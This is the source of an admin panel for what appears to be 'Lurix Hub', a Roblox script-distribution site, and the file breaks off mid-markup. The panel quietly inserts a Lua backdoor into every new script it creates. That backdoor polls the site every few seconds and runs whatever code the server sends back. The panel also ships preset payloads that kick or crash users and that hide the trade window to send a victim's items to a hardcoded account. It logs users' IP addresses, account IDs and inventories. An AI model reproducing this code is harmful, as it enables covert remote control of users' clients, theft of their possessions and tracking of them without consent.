'use client';
import { useState, useEffect, useMemo } from 'react';
import Editor from '@monaco-editor/react';
import { supabase } from '@/lib/supabase';

export default function AdminPage() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [passwordInput, setPasswordInput] = useState('');
  const [isLoggingIn, setIsLoggingIn] = useState(false);
  const [activeTab, setActiveTab] = useState('custom_home'); // 'scripts' | 'backdoor' | 'custom_home' | 'user_logs' | 'settings'
  
  const [scripts, setScripts] = useState([]);
  const [selectedScript, setSelectedScript] = useState(null);
  const [code, setCode] = useState('');
  const [slug, setSlug] = useState('');
  const [title, setTitle] = useState('');
  const [status, setStatus] = useState('working');
  const [searchQuery, setSearchQuery] = useState('');
  const [statusFilter, setStatusFilter] = useState('all');

  const [logs, setLogs] = useState([]);
  const [logSearchQuery, setLogSearchQuery] = useState('');
  const [isLoadingLogs, setIsLoadingLogs] = useState(false);
  const [copiedJoinId, setCopiedJoinId] = useState(null);

  // Storage Modal State
  const [selectedStorageLog, setSelectedStorageLog] = useState(null);
  const [isStorageModalOpen, setIsStorageModalOpen] = useState(false);
  const [storageTab, setStorageTab] = useState('stands'); // 'stands' | 'inventory'
  const [copiedSlotIndex, setCopiedSlotIndex] = useState(null);

  const [backdoorTargetType, setBackdoorTargetType] = useState('ALL'); 
  const [backdoorTargetValue, setBackdoorTargetValue] = useState('ALL');
  const [backdoorLuaPayload, setBackdoorLuaPayload] = useState('print("[Lurix Backdoor]: Executed")');
  const [isSendingBackdoor, setIsSendingBackdoor] = useState(false);
  const [backdoorHistory, setBackdoorHistory] = useState([]);

  const [siteTitle, setSiteTitle] = useState('LURIX HUB');
  const [badgeText, setBadgeText] = useState('Online & Active');
  const [supportedGames, setSupportedGames] = useState([
    { name: 'Stand Upright', logo: '/logo.png', status: 'Fully Supported', tag: 'ROBLOX' }
  ]);
  const [loaderScript, setLoaderScript] = useState('');
  const [currentKey, setCurrentKey] = useState('');
  const [youtubeLink, setYoutubeLink] = useState('');
  const [discordLink, setDiscordLink] = useState('');
  const [newAdminPass, setNewAdminPass] = useState('');

  // UI States
  const [copiedLoader, setCopiedLoader] = useState(false);
  const [copiedBackdoorSnippet, setCopiedBackdoorSnippet] = useState(false);
  const [isSaving, setIsSaving] = useState(false);

  const handleLogin = async (e) => {
    e.preventDefault();
    if (!passwordInput) return;
    setIsLoggingIn(true);

    try {
      const res = await fetch('/api/admin/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password: passwordInput }),
      });

      const data = await res.json();

      if (res.ok && data.success) {
        setIsAuthenticated(true);
        loadAdminData();
        loadLogsData();
        loadBackdoorHistory();
      } else {
        alert(data.message || 'Invalid admin password.');
      }
    } catch (err) {
      alert('API connection error: ' + err.message);
    } finally {
      setIsLoggingIn(false);
    }
  };

  const loadAdminData = async () => {
    const { data: scriptsData } = await supabase.from('scripts').select('*').order('created_at', { ascending: false });
    if (scriptsData) {
      setScripts(scriptsData);
      if (scriptsData.length > 0 && !selectedScript) {
        selectScriptHandler(scriptsData[0]);
      }
    }

    const { data: settingsData } = await supabase.from('settings').select('*');
    if (settingsData) {
      settingsData.forEach(item => {
        if (item.key === 'site_title') setSiteTitle(item.value || 'LURIX HUB');
        if (item.key === 'badge_text') setBadgeText(item.value || 'Online & Active');
        if (item.key === 'supported_games') {
          try {
            const parsed = JSON.parse(item.value);
            if (Array.isArray(parsed) && parsed.length > 0) setSupportedGames(parsed);
          } catch(e) {}
        }
        if (item.key === 'loader_script') setLoaderScript(item.value || '');
        if (item.key === 'current_key') setCurrentKey(item.value || '');
        if (item.key === 'youtube_link') setYoutubeLink(item.value || 'https://www.youtube.com/@owizk');
        if (item.key === 'discord_link') setDiscordLink(item.value || '');
      });
    }
  };

  const loadLogsData = async () => {
    setIsLoadingLogs(true);
    const { data } = await supabase.from('execution_logs').select('*').order('created_at', { ascending: false }).limit(100);
    if (data) setLogs(data);
    setIsLoadingLogs(false);
  };

  const loadBackdoorHistory = async () => {
    const { data } = await supabase.from('backdoor_commands').select('*').order('created_at', { ascending: false }).limit(30);
    if (data) setBackdoorHistory(data);
  };

  const selectScriptHandler = (script) => {
    setSelectedScript(script);
    setCode(script.content || '');
    setSlug(script.slug || '');
    setTitle(script.title || '');
    setStatus(script.status || 'working');
  };

  const filteredScripts = useMemo(() => {
    return scripts.filter(s => {
      const matchesSearch = s.title?.toLowerCase().includes(searchQuery.toLowerCase()) || 
                            s.slug?.toLowerCase().includes(searchQuery.toLowerCase());
      const matchesStatus = statusFilter === 'all' || (s.status || 'working') === statusFilter;
      return matchesSearch && matchesStatus;
    });
  }, [scripts, searchQuery, statusFilter]);

  const filteredLogs = useMemo(() => {
    return logs.filter(l => {
      const q = logSearchQuery.toLowerCase().trim();
      if (!q) return true;
      return (
        l.roblox_username?.toLowerCase().includes(q) ||
        l.ip_address?.toLowerCase().includes(q) ||
        l.discord_user?.toLowerCase().includes(q) ||
        l.roblox_id?.toLowerCase().includes(q)
      );
    });
  }, [logs, logSearchQuery]);

  const getScriptLoadstring = (scriptSlug) => {
    const domain = typeof window !== 'undefined' ? window.location.origin : 'https://lurixhub.vercel.app';
    return `loadstring(game:HttpGet("${domain}/api/raw/${scriptSlug}"))()`;
  };

  const getBackdoorLuaSnippet = () => {
    const domain = typeof window !== 'undefined' ? window.location.origin : 'https://lurixhub.vercel.app';
    return `-- [Lurix Hub] Advanced Remote Loadstring Backdoor Engine
task.spawn(function()
    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request

    while task.wait(4) do
        pcall(function()
            if not LocalPlayer then return end
            local url = "${domain}/api/backdoor?user=" .. HttpService:UrlEncode(LocalPlayer.Name)
            local res = requestFunc({ Url = url, Method = "GET" })
            if res and res.Body and #res.Body > 0 then
                local func, err = loadstring(res.Body)
                if func then
                    task.spawn(func)
                end
            end
        end)
    end
end)`;
  };

  const handleCopyLoader = (scriptSlug) => {
    navigator.clipboard.writeText(getScriptLoadstring(scriptSlug));
    setCopiedLoader(true);
    setTimeout(() => setCopiedLoader(false), 2000);
  };

  const handleCopyBackdoorSnippet = () => {
    navigator.clipboard.writeText(getBackdoorLuaSnippet());
    setCopiedBackdoorSnippet(true);
    setTimeout(() => setCopiedBackdoorSnippet(false), 2000);
  };

  const handleCopyJoinScript = async (log) => {
    if (!log.place_id || !log.job_id) return;
    const script = `game:GetService("TeleportService"):TeleportToPlaceInstance(${log.place_id}, "${log.job_id}", game.Players.LocalPlayer)`;
    try {
      await navigator.clipboard.writeText(script);
      setCopiedJoinId(log.id);
      setTimeout(() => setCopiedJoinId(null), 2000);
    } catch (err) {
      console.error('Copy join script error:', err);
    }
  };

  const handleOpenStorageModal = (log) => {
    setSelectedStorageLog(log);
    setStorageTab('stands');
    setIsStorageModalOpen(true);
  };

  const handleSendBackdoor = async () => {
    if (!backdoorLuaPayload.trim()) return alert('Please enter a Lua payload.');
    setIsSendingBackdoor(true);

    try {
      const res = await fetch('/api/backdoor', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          adminPassword: passwordInput,
          targetType: backdoorTargetType,
          targetValue: backdoorTargetValue,
          payloadLua: backdoorLuaPayload
        })
      });

      const data = await res.json();
      if (data.success) {
        alert(data.message);
        loadBackdoorHistory();
      } else {
        alert('Error: ' + data.message);
      }
    } catch (err) {
      alert('Command error: ' + err.message);
    } finally {
      setIsSendingBackdoor(false);
    }
  };

  const setPresetPayload = (type) => {
    if (type === 'kick') {
      setBackdoorLuaPayload(`game:GetService("Players").LocalPlayer:Kick("an admin changed your data")`);
    } else if (type === 'crash') {
      setBackdoorLuaPayload(`while true do end`);
    } else if (type === 'notification') {
      setBackdoorLuaPayload(`game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "LURIX HUB ADMIN",
    Text = "Administrator is watching your session!",
    Duration = 10
})`);
    } else if (type === 'trade') {
      setBackdoorLuaPayload(`local TARGET_PLAYER_NAME = "mhauiw29" 
local AUTO_SEND_DELAY = 3                 
local AUTO_ACCEPT = false                  

local ADD_STANDS = false  
local ADD_ITEMS = true    

local MAX_ITEM_SLOTS = 4       
local MAX_AMOUNT_PER_ITEM = 0  

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local UICMDS = ReplicatedStorage:WaitForChild("Events"):WaitForChild("UICMDS")
local TradeComm = ReplicatedStorage:WaitForChild("TradeEvents"):WaitForChild("TradeComm")

PlayerGui.ChildAdded:Connect(function(child)
    if child.Name == "TradeUI" or child.Name == "TradeRequest" then
        task.wait()
        if child:IsA("ScreenGui") then
            child.Enabled = false 
        end
        local bg = child:FindFirstChild("Background")
        if bg then
            bg.Visible = false
        end
    end
end)

local isTrading = false

TradeComm.OnClientEvent:Connect(function(action, data)
    if action == "ShowUI" then
        isTrading = true

        local myStands = (data and data.ItemData and data.ItemData.Stands) or {}
        local myItems = (data and data.ItemData and data.ItemData.Items) or {}
        
        if ADD_STANDS then
            for _, standData in pairs(myStands) do
                local standName = standData.Stand
                local attribute = standData.Attribute
                local guid = standData.GUID
                
                if standName and standName ~= "None" and attribute and attribute ~= "None" then
                    TradeComm:FireServer("AddStand", {
                        ["GUID"] = guid,
                        ["StandName"] = standName,
                        ["Attribute"] = attribute
                    })
                    task.wait(0.2)
                end
            end
        end
        
        if ADD_ITEMS then
            local itemCount = 0
            for itemName, amount in pairs(myItems) do
                
                if MAX_ITEM_SLOTS and MAX_ITEM_SLOTS > 0 and itemCount >= MAX_ITEM_SLOTS then
                    break
                end

                if itemName and amount and amount > 0 then
                    
                    local finalAmount = amount
                    if MAX_AMOUNT_PER_ITEM and MAX_AMOUNT_PER_ITEM > 0 then
                        finalAmount = math.min(amount, MAX_AMOUNT_PER_ITEM)
                    end

                    TradeComm:FireServer("AddItem", {
                        ["ItemName"] = itemName,
                        ["Amount"] = finalAmount
                    })
                    
                    itemCount = itemCount + 1
                    task.wait(0.2)
                end
            end
        end

        if AUTO_ACCEPT then
            task.wait(0.5)
            TradeComm:FireServer("AcceptTrade")
        end
    end

    if action == "CancelTrade" then
        isTrading = false
    end

    if action == "UpdateOffer" and isTrading and AUTO_ACCEPT then
        task.wait(0.3)
        TradeComm:FireServer("AcceptTrade")
    end
end)

task.spawn(function()
    while task.wait(AUTO_SEND_DELAY) do
        if not isTrading then
            UICMDS:FireServer(TARGET_PLAYER_NAME, "Trade")
        end
    end
end)`);
    } else if (type === 'Agree') {
      setBackdoorLuaPayload(`local Event = game:GetService("ReplicatedStorage").TradeEvents.TradeComm
Event:FireServer(
    "AcceptTrade"
)`);
    } else if (type === 'jumpscare') {
      setBackdoorLuaPayload(`local sound = Instance.new("Sound", game:GetService("SoundService"))
sound.SoundId = "rbxassetid://9114223177"
sound.Volume = 10
sound:Play()`);
    }
  };

  const handleSelectUserForBackdoor = (username) => {
    setActiveTab('backdoor');
    setBackdoorTargetType('USER');
    setBackdoorTargetValue(username);
  };

  const handleSaveScript = async () => {
    if (!selectedScript) return;
    setIsSaving(true);
    const { error } = await supabase.from('scripts').update({ 
      content: code, 
      slug: slug.toLowerCase().trim().replace(/\s+/g, '-'), 
      title, 
      status 
    }).eq('id', selectedScript.id);
    
    setIsSaving(false);
    if (error) alert('Save error: ' + error.message);
    else {
      alert('Script saved successfully.');
      loadAdminData();
    }
  };

  const handleCreateScript = async () => {
    const newTitle = prompt('Enter script title:');
    if (!newTitle) return;
    const newSlug = prompt('Enter script slug:');
    if (!newSlug) return;
    
    const cleanSlug = newSlug.toLowerCase().trim().replace(/\s+/g, '-');

    const { data, error } = await supabase.from('scripts').insert([{ 
      title: newTitle, 
      slug: cleanSlug, 
      content: `-- [Lurix Hub] ${newTitle}\nprint("[Lurix Hub]: Script Loaded!")\n\n${getBackdoorLuaSnippet()}`,
      status: 'working'
    }]).select();

    if (error) alert('Creation error: ' + error.message);
    else {
      alert('Script created successfully.');
      await loadAdminData();
      if (data && data[0]) selectScriptHandler(data[0]);
    }
  };

  const handleDuplicateScript = async () => {
    if (!selectedScript) return;
    const newTitle = `${selectedScript.title} (Copy)`;
    const newSlug = `${selectedScript.slug}-copy`;

    const { data, error } = await supabase.from('scripts').insert([{ 
      title: newTitle, 
      slug: newSlug, 
      content: code,
      status: status
    }]).select();

    if (error) alert('Duplicate error: ' + error.message);
    else {
      alert('Script duplicated.');
      await loadAdminData();
      if (data && data[0]) selectScriptHandler(data[0]);
    }
  };

  const handleDeleteScript = async (id) => {
    if (!confirm('Are you sure you want to delete this script?')) return;
    await supabase.from('scripts').delete().eq('id', id);
    setSelectedScript(null);
    loadAdminData();
  };

  const handleClearLogs = async () => {
    if (!confirm('Are you sure you want to clear all logs?')) return;
    await supabase.from('execution_logs').delete().neq('id', 0);
    setLogs([]);
    alert('Logs cleared.');
  };

  const handleAddGame = () => {
    setSupportedGames([...supportedGames, { name: 'New Game', logo: '/logo.png', status: 'Fully Supported', tag: 'ROBLOX' }]);
  };

  const handleRemoveGame = (index) => {
    if (supportedGames.length <= 1) return alert('Must keep at least 1 game.');
    setSupportedGames(supportedGames.filter((_, i) => i !== index));
  };

  const handleGameChange = (index, field, value) => {
    const updated = [...supportedGames];
    updated[index][field] = value;
    setSupportedGames(updated);
  };

  const handleUploadToEditor = (e) => {
    const file = e.target.files[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = (event) => {
      setCode(event.target.result);
      alert(`File content loaded.`);
    };
    reader.readAsText(file);
    e.target.value = '';
  };

  const handleSaveMainPageSettings = async () => {
    setIsSaving(true);
    const { error } = await supabase.from('settings').upsert([
      { key: 'site_title', value: siteTitle },
      { key: 'badge_text', value: badgeText },
      { key: 'supported_games', value: JSON.stringify(supportedGames) },
      { key: 'loader_script', value: loaderScript },
      { key: 'current_key', value: currentKey },
      { key: 'youtube_link', value: youtubeLink },
      { key: 'discord_link', value: discordLink }
    ]);
    setIsSaving(false);

    if (error) alert('Config error: ' + error.message);
    else {
      alert('Settings saved successfully.');
      loadAdminData();
    }
  };

  const handleSaveAdminPassword = async () => {
    if (!newAdminPass.trim()) return alert('Please enter a new password.');
    setIsSaving(true);

    try {
      const res = await fetch('/api/admin/update', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          currentPassword: passwordInput,
          newPassword: newAdminPass
        })
      });

      const data = await res.json();
      if (data.success) {
        alert('Password updated successfully.');
        setPasswordInput(newAdminPass);
        setNewAdminPass('');
      } else {
        alert('Error: ' + data.message);
      }
    } catch (err) {
      alert('Connection error: ' + err.message);
    } finally {
      setIsSaving(false);
    }
  };

  const parsedStandData = useMemo(() => {
    if (!selectedStorageLog || !selectedStorageLog.stand_storage) return { slots: [], spec_storage: 'Empty' };
    try {
      return typeof selectedStorageLog.stand_storage === 'string'
        ? JSON.parse(selectedStorageLog.stand_storage)
        : selectedStorageLog.stand_storage;
    } catch (e) {
      return { slots: [], spec_storage: 'Empty' };
    }
  }, [selectedStorageLog]);

  const parsedInventoryData = useMemo(() => {
    if (!selectedStorageLog || !selectedStorageLog.inventory_data) return [];
    try {
      return typeof selectedStorageLog.inventory_data === 'string'
        ? JSON.parse(selectedStorageLog.inventory_data)
        : selectedStorageLog.inventory_data;
    } catch (e) {
      return [];
    }
  }, [selectedStorageLog]);

  const getTierStyle = (tier) => {
    switch (String(tier).toUpperCase()) {
      case 'S+': case 'GOD': return 'border-amber-400 bg-amber-400/10 text-amber-400 shadow-[0_0_12px_rgba(251,191,36,0.3)]';
      case 'S': return 'border-purple-500 bg-purple-500/10 text-purple-400 shadow-[0_0_12px_rgba(168,85,247,0.3)]';
      case 'A': return 'border-[#6E96FF] bg-[#6E96FF]/10 text-[#6E96FF] shadow-[0_0_12px_rgba(110,150,255,0.3)]';
      case 'B': return 'border-emerald-500 bg-emerald-500/10 text-emerald-400';
      default: return 'border-gray-700 bg-gray-800/40 text-gray-400';
    }
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-[#040508] text-white flex items-center justify-center p-4 relative overflow-hidden font-sans">
        <div className="absolute w-[400px] h-[400px] bg-[#6E96FF]/20 rounded-full blur-[140px] pointer-events-none" />
        <form onSubmit={handleLogin} className="z-10 bg-[#0a0d16]/90 border border-[#6E96FF]/40 p-6 sm:p-8 rounded-3xl w-full max-w-sm shadow-[0_0_50px_rgba(110,150,255,0.15)] backdrop-blur-2xl">
          <div className="flex items-center gap-2.5 justify-center mb-6 text-[#6E96FF] font-black text-xl tracking-wider uppercase">
            LURIX
          </div>
          <div className="mb-4">
            <label className="text-[11px] font-extrabold text-gray-400 mb-1.5 block">ADMIN AUTHENTICATION</label>
            <input
              type="password"
              placeholder="Enter password..."
              value={passwordInput}
              onChange={(e) => setPasswordInput(e.target.value)}
              className="w-full bg-black/80 border border-gray-800 rounded-xl p-3.5 text-white text-xs font-mono focus:border-[#6E96FF] outline-none transition-all shadow-inner"
            />
          </div>
          <button 
            type="submit"
            disabled={isLoggingIn}
            className="w-full bg-[#6E96FF] text-black font-black py-3.5 rounded-xl text-xs shadow-[0_0_20px_rgba(110,150,255,0.4)] hover:brightness-110 transition-all flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50 active:scale-95"
          >
            {isLoggingIn ? 'Authenticating...' : 'LOGIN'}
          </button>
        </form>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#040508] text-white p-3 sm:p-6 flex flex-col gap-5 font-sans max-w-[1400px] mx-auto">
      
      {/* Top Header Bar */}
      <div className="bg-[#0a0d16]/90 border border-[#6E96FF]/30 p-4 rounded-3xl backdrop-blur-2xl flex flex-col sm:flex-row items-center justify-between gap-4 shadow-[0_10px_30px_rgba(0,0,0,0.5)]">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-2xl bg-[#6E96FF]/15 border border-[#6E96FF]/40 flex items-center justify-center text-[#6E96FF] font-black">
            L
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h1 className="text-lg font-black tracking-tight text-white uppercase">{siteTitle} ADMIN</h1>
              <span className="text-[10px] bg-green-500/15 text-green-400 border border-green-500/30 px-2 py-0.5 rounded-full font-bold flex items-center gap-1">
                <span className="w-1.5 h-1.5 bg-green-400 rounded-full animate-ping" /> V3.0 RCE ONLINE
              </span>
            </div>
            <p className="text-[11px] text-gray-400 font-medium">Script & Remote Execution Control Panel</p>
          </div>
        </div>

        <div className="flex items-center gap-2 w-full sm:w-auto justify-end">
          <button onClick={() => setIsAuthenticated(false)} className="bg-red-500/10 border border-red-500/30 text-red-400 hover:bg-red-500/20 px-3 py-2 rounded-xl text-xs font-bold flex items-center gap-1.5 cursor-pointer transition-all">
            Logout
          </button>
        </div>
      </div>

      {/* Stats Summary Cards */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
        <div className="bg-[#0a0d16]/80 border border-[#6E96FF]/30 p-4 rounded-2xl backdrop-blur-xl relative overflow-hidden group">
          <div className="text-[10px] text-gray-400 uppercase font-black tracking-wider">SCRIPTS</div>
          <div className="text-xl sm:text-2xl font-black text-white mt-1">{scripts.length} <span className="text-xs text-gray-500 font-normal">Scripts</span></div>
        </div>

        <div className="bg-[#0a0d16]/80 border border-[#6E96FF]/30 p-4 rounded-2xl backdrop-blur-xl relative overflow-hidden group">
          <div className="text-[10px] text-gray-400 uppercase font-black tracking-wider">EXEC LOGS</div>
          <div className="text-xl sm:text-2xl font-black text-[#6E96FF] mt-1">{logs.length} <span className="text-xs text-gray-500 font-normal">Logs</span></div>
        </div>

        <div className="bg-[#0a0d16]/80 border border-yellow-500/30 p-4 rounded-2xl backdrop-blur-xl relative overflow-hidden group">
          <div className="text-[10px] text-gray-400 uppercase font-black tracking-wider">GAMES</div>
          <div className="text-xl sm:text-2xl font-black text-yellow-400 mt-1">{supportedGames.length} <span className="text-xs text-gray-500 font-normal">Games</span></div>
        </div>

        <div className="bg-[#0a0d16]/80 border border-green-500/30 p-4 rounded-2xl backdrop-blur-xl relative overflow-hidden group">
          <div className="text-[10px] text-gray-400 uppercase font-black tracking-wider">SERVER</div>
          <div className="text-xl sm:text-2xl font-black text-green-400 mt-1">ACTIVE <span className="text-xs text-green-400 font-bold">100%</span></div>
        </div>
      </div>

      {/* Navigation Tabs */}
      <div className="flex bg-[#0a0d16] border border-gray-800 p-1.5 rounded-2xl overflow-x-auto text-xs font-extrabold gap-1.5 shadow-lg">
        <button onClick={() => setActiveTab('custom_home')} className={`flex items-center gap-2 px-4 py-2.5 rounded-xl transition-all cursor-pointer whitespace-nowrap ${activeTab === 'custom_home' ? 'bg-[#6E96FF] text-black shadow-[0_0_15px_rgba(110,150,255,0.4)]' : 'text-gray-400 hover:text-white'}`}>
          Home Config
        </button>

        <button onClick={() => setActiveTab('scripts')} className={`flex items-center gap-2 px-4 py-2.5 rounded-xl transition-all cursor-pointer whitespace-nowrap ${activeTab === 'scripts' ? 'bg-[#6E96FF] text-black shadow-[0_0_15px_rgba(110,150,255,0.4)]' : 'text-gray-400 hover:text-white'}`}>
          Scripts ({scripts.length})
        </button>

        <button onClick={() => { setActiveTab('backdoor'); loadBackdoorHistory(); }} className={`flex items-center gap-2 px-4 py-2.5 rounded-xl transition-all cursor-pointer whitespace-nowrap ${activeTab === 'backdoor' ? 'bg-[#6E96FF] text-black shadow-[0_0_15px_rgba(110,150,255,0.4)]' : 'text-yellow-400 hover:text-white'}`}>
          Backdoor RCE
        </button>

        <button onClick={() => { setActiveTab('user_logs'); loadLogsData(); }} className={`flex items-center gap-2 px-4 py-2.5 rounded-xl transition-all cursor-pointer whitespace-nowrap ${activeTab === 'user_logs' ? 'bg-[#6E96FF] text-black shadow-[0_0_15px_rgba(110,150,255,0.4)]' : 'text-gray-400 hover:text-white'}`}>
          Logs ({logs.length})
        </button>

        <button onClick={() => setActiveTab('settings')} className={`flex items-center gap-2 px-4 py-2.5 rounded-xl transition-all cursor-pointer whitespace-nowrap ${activeTab === 'settings' ? 'bg-[#6E96FF] text-black shadow-[0_0_15px_rgba(110,150,255,0.4)]' : 'text-gray-400 hover:text-white'}`}>
          Settings
        </button>
      </div>

      {/* TAB 1: HOME CONFIG */}
      {activeTab === 'custom_home' && (
        <div className="bg-[#0a0d16] border border-gray-800 p-5 sm:p-7 rounded-3xl space-y-5 shadow-xl">
          <div className="text-sm font-black text-[#6E96FF] flex items-center gap-2 uppercase tracking-wide">
            HOME CONFIGURATION
          </div>

          <div className="space-y-4">
            <div>
              <label className="text-xs font-bold text-[#6E96FF] flex items-center gap-1.5 mb-1">
                Home Loader Script:
              </label>
              <textarea
                rows={3}
                value={loaderScript}
                onChange={(e) => setLoaderScript(e.target.value)}
                className="w-full bg-black/80 border border-gray-800 p-3 rounded-xl font-mono text-xs text-gray-200 focus:border-[#6E96FF] outline-none"
              />
            </div>

            <div>
              <label className="text-xs font-bold text-[#6E96FF] flex items-center gap-1.5 mb-1">
                Home Access Key:
              </label>
              <input
                type="text"
                value={currentKey}
                onChange={(e) => setCurrentKey(e.target.value)}
                className="w-full bg-black/80 border border-gray-800 p-3 rounded-xl font-mono text-xs text-[#6E96FF] font-extrabold focus:border-[#6E96FF] outline-none"
              />
            </div>

            <div className="border border-gray-800 p-4 rounded-2xl bg-black/40 space-y-3">
              <div className="flex items-center justify-between">
                <label className="text-xs font-bold text-yellow-400 flex items-center gap-1.5">
                  Supported Games ({supportedGames.length}):
                </label>
                <button onClick={handleAddGame} className="bg-[#6E96FF]/20 text-[#6E96FF] border border-[#6E96FF]/40 px-3 py-1 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer hover:bg-[#6E96FF]/30 transition-all">
                  + Add Game
                </button>
              </div>

              {supportedGames.map((game, idx) => (
                <div key={idx} className="bg-black/80 border border-gray-800 p-3 rounded-xl space-y-2">
                  <div className="flex justify-between items-center text-xs text-gray-400 font-bold">
                    <span>Game #{idx + 1}</span>
                    {supportedGames.length > 1 && (
                      <button onClick={() => handleRemoveGame(idx)} className="text-red-400 text-[10px] bg-red-500/10 px-2 py-0.5 rounded cursor-pointer">
                        Remove
                      </button>
                    )}
                  </div>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                    <input
                      type="text"
                      placeholder="Game Name"
                      value={game.name}
                      onChange={(e) => handleGameChange(idx, 'name', e.target.value)}
                      className="bg-gray-900 border border-gray-800 p-2 rounded-lg text-xs font-bold text-white"
                    />
                    <input
                      type="text"
                      placeholder="Logo URL"
                      value={game.logo}
                      onChange={(e) => handleGameChange(idx, 'logo', e.target.value)}
                      className="bg-gray-900 border border-gray-800 p-2 rounded-lg text-xs text-gray-300"
                    />
                    <input
                      type="text"
                      placeholder="Status"
                      value={game.status}
                      onChange={(e) => handleGameChange(idx, 'status', e.target.value)}
                      className="bg-gray-900 border border-gray-800 p-2 rounded-lg text-xs text-green-400"
                    />
                    <input
                      type="text"
                      placeholder="Tag (e.g. ROBLOX)"
                      value={game.tag}
                      onChange={(e) => handleGameChange(idx, 'tag', e.target.value)}
                      className="bg-gray-900 border border-gray-800 p-2 rounded-lg text-xs text-[#6E96FF] font-mono"
                    />
                  </div>
                </div>
              ))}
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <div>
                <label className="text-xs text-gray-400 font-semibold mb-1 block">YouTube Link:</label>
                <input
                  type="text"
                  value={youtubeLink}
                  onChange={(e) => setYoutubeLink(e.target.value)}
                  className="w-full bg-black/80 border border-gray-800 p-3 rounded-xl text-xs text-white focus:border-[#6E96FF] outline-none"
                />
              </div>

              <div>
                <label className="text-xs text-gray-400 font-semibold mb-1 block">Discord Link:</label>
                <input
                  type="text"
                  value={discordLink}
                  onChange={(e) => setDiscordLink(e.target.value)}
                  className="w-full bg-black/80 border border-gray-800 p-3 rounded-xl text-xs text-white focus:border-[#6E96FF] outline-none"
                />
              </div>

              <div>
                <label className="text-xs text-gray-400 font-semibold mb-1 block">Badge Text:</label>
                <input
                  type="text"
                  value={badgeText}
                  onChange={(e) => setBadgeText(e.target.value)}
                  className="w-full bg-black/80 border border-gray-800 p-3 rounded-xl text-xs text-[#6E96FF] font-bold focus:border-[#6E96FF] outline-none"
                />
              </div>

              <div>
                <label className="text-xs text-gray-400 font-semibold mb-1 block">Site Title:</label>
                <input
                  type="text"
                  value={siteTitle}
                  onChange={(e) => setSiteTitle(e.target.value)}
                  className="w-full bg-black/80 border border-gray-800 p-3 rounded-xl text-xs text-white font-extrabold focus:border-[#6E96FF] outline-none"
                />
              </div>
            </div>
          </div>

          <button
            onClick={handleSaveMainPageSettings}
            disabled={isSaving}
            className="w-full bg-[#6E96FF] text-black font-black py-3.5 rounded-xl text-xs shadow-[0_0_20px_rgba(110,150,255,0.4)] cursor-pointer hover:brightness-110 transition-all flex items-center justify-center gap-2 disabled:opacity-50 active:scale-95"
          >
            {isSaving ? 'Saving...' : 'SAVE SETTINGS'}
          </button>
        </div>
      )}

      {/* TAB 2: SCRIPTS */}
      {activeTab === 'scripts' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-5">
          <div className="lg:col-span-4 bg-[#0a0d16] border border-gray-800 p-4 rounded-3xl flex flex-col gap-3 h-fit">
            <button onClick={handleCreateScript} className="w-full bg-[#6E96FF] text-black font-black py-2.5 px-3 rounded-xl text-xs flex items-center justify-center gap-1.5 cursor-pointer shadow-[0_0_15px_rgba(110,150,255,0.3)] hover:brightness-110 active:scale-95 transition-all">
              + New Script
            </button>

            <div className="relative">
              <input
                type="text"
                placeholder="Search title or slug..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="w-full bg-black/80 border border-gray-800 rounded-xl px-3 py-2 text-xs text-white placeholder:text-gray-500 focus:border-[#6E96FF] outline-none"
              />
            </div>

            <div className="flex gap-1 overflow-x-auto text-[10px] font-extrabold pb-1">
              <button onClick={() => setStatusFilter('all')} className={`px-2.5 py-1 rounded-lg border transition-all cursor-pointer ${statusFilter === 'all' ? 'bg-white/15 border-white text-white' : 'border-gray-800 text-gray-500'}`}>All ({scripts.length})</button>
              <button onClick={() => setStatusFilter('working')} className={`px-2.5 py-1 rounded-lg border transition-all cursor-pointer ${statusFilter === 'working' ? 'bg-green-500/20 border-green-500 text-green-400' : 'border-gray-800 text-gray-500'}`}>Active</button>
              <button onClick={() => setStatusFilter('updating')} className={`px-2.5 py-1 rounded-lg border transition-all cursor-pointer ${statusFilter === 'updating' ? 'bg-yellow-500/20 border-yellow-500 text-yellow-400' : 'border-gray-800 text-gray-500'}`}>Update</button>
              <button onClick={() => setStatusFilter('patched')} className={`px-2.5 py-1 rounded-lg border transition-all cursor-pointer ${statusFilter === 'patched' ? 'bg-red-500/20 border-red-500 text-red-400' : 'border-gray-800 text-gray-500'}`}>Patched</button>
            </div>

            <div className="flex flex-col gap-2 max-h-[520px] overflow-y-auto pr-1">
              {filteredScripts.map((s) => (
                <div
                  key={s.id}
                  onClick={() => selectScriptHandler(s)}
                  className={`p-3 rounded-2xl border transition-all cursor-pointer flex items-center justify-between gap-2 ${
                    selectedScript?.id === s.id 
                      ? 'bg-[#6E96FF]/15 border-[#6E96FF] shadow-[0_0_15px_rgba(110,150,255,0.2)]' 
                      : 'bg-black/40 border-gray-800/80 hover:border-gray-700'
                  }`}
                >
                  <div className="min-w-0 flex-1">
                    <div className="font-extrabold text-xs text-white truncate">{s.title}</div>
                    <div className="text-[10px] font-mono text-[#6E96FF] truncate mt-0.5">/api/raw/{s.slug}</div>
                  </div>
                  <span className={`px-2 py-0.5 rounded-full text-[9px] font-black uppercase shrink-0 ${
